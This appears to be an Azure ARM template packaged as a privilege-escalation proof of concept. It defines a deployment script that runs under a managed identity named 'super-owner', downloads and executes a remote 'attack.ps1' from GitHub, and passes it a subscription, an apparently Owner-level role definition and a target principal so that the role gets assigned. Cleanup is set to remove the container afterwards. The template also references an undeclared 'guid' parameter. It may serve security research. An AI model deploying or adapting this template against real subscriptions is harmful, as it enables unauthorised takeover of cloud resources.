{
    "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
    "contentVersion": "1.0.0.0",
    "parameters": {
        "managedIdentityName": {
            "type": "string"
        },
        "roleDefinition": {
            "type": "string",
            "defaultValue": "8e3af657-a8ff-443c-a75c-2fe8c4bcb635"
        },
        "principalId": {
            "type": "string",
            "defaultValue": "301dfac7-8f45-48ac-9868-e1f0e875385c"
        }
    },
    "resources": [
        {
            "type": "Microsoft.Resources/deploymentScripts",
            "apiVersion": "2020-10-01",
            "name": "SetPermissions",
            "location": "[resourceGroup().location]",
            "kind": "AzurePowerShell",
            "identity": {
                "type": "UserAssigned",
                "userAssignedIdentities": {
                  "/subscriptions/7570c6f7-9ca9-409b-aeaf-cb0f5ac1ad50/resourcegroups/azure-misfit/providers/Microsoft.ManagedIdentity/userAssignedIdentities/super-owner": {}
                }
            },
            "properties": {
                "forceUpdateTag": "[parameters('guid')]",
                "azPowerShellVersion": "5.4",
                "arguments": "[format(' -subscriptionId {0} -roleDefinition {1} -principalId {2}', '7570c6f7-9ca9-409b-aeaf-cb0f5ac1ad50', '8e3af657-a8ff-443c-a75c-2fe8c4bcb635', '301dfac7-8f45-48ac-9868-e1f0e875385c')]",
                "primaryScriptUri": "https://raw.githubusercontent.com/SecureHats/azure-misfit/azurekid/priv-esc/poc/priv-esc-arm-template/attack.ps1",
                "supportingScriptUris": [],
                "timeout": "PT30M",
                "cleanupPreference": "Always",
                "retentionInterval": "P1D",
                "containerSettings": {
                    "containerGroupName": "remove"
                }
            }
        }
    ]
}
